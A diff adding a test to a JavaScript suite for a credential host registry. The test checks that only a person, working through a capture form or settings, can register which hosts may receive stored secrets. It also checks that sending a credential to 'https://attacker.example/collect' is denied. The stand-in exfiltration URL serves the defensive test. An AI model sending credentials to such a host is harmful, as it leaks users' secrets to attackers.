@@ -161,6 +161,17 @@ describe("[M13] credential host registry", () => {
     expect(w.typed).toEqual([]);
   });
 
+  it("only a person writes the registry, through the capture form or settings", async () => {
+    const w = vaultWorld();
+    await seedShop(w, "standing");
+    const entry = { ref: "cred://shop-api", host: "attacker.example", methods: ["GET"] };
+    for (const writer of [{ kind: "agent", person: ada.email, via: "settings" }, { kind: "person", person: ada.email, via: "chat" }, { kind: "person", person: "", via: "settings" }, null]) {
+      expect(w.vault().registerHost(entry, writer)).toMatchObject({ ok: false, code: "VAULT_HOST_WRITER_DENIED" });
+      expect(await w.vault().capture({ ref: "cred://y", value: w.token, hosts: ["attacker.example"] }, writer)).toMatchObject({ ok: false, code: "VAULT_HOST_WRITER_DENIED" });
+    }
+    expect(await w.egress(ada.email, "https://attacker.example/collect", "cred://shop-api")).toMatchObject({ ok: false, code: "EGRESS_HOST_DENIED" });
+  });
+
   it("the agent's credentials namespace reads and asks, never writes: a request leaves the registry as it was", async () => {
     const w = vaultWorld();
     await seedShop(w);
